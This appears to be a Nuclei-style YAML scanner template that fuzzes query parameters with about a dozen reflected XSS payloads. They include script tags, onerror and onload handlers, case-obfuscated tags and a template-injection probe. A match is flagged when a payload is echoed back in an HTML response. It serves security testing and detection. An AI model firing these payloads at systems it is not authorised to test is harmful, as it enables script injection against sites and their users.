id: reflected-xss

info:
  name: Reflected Cross Site Scripting
  author: pdteam
  severity: medium
  tags: xss,rxss,dast

variables:
  first: "{{rand_int(10000, 99999)}}"
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      reflection:
        - "'\"><{{first}}"
        - "<img src=x onerror=alert({{first}})>"
        - "<script>alert({{first}})</script>"
        - "'><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><ScRiPt>alert({{first}})</sCrIpT>"
        - "</script><script>alert({{first}})</script>"
        - "</script><script>alert(%27{{first}}%27)</script>%27"><41707
        - "<body onload=alert({{first}})>"
        - "<marquee><img src=x onerror=confirm({{first}})></marquee>"
        - "'><img%20src=xxx:x%20\x20onerror=javascript:alert({{first}})>"
        - "\u0022\u003c%26quot;%26gt;%26lt;\"';}};â€œ></SCRIPT><img src=x onerror=alert({{first}})>${{7*7}}"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
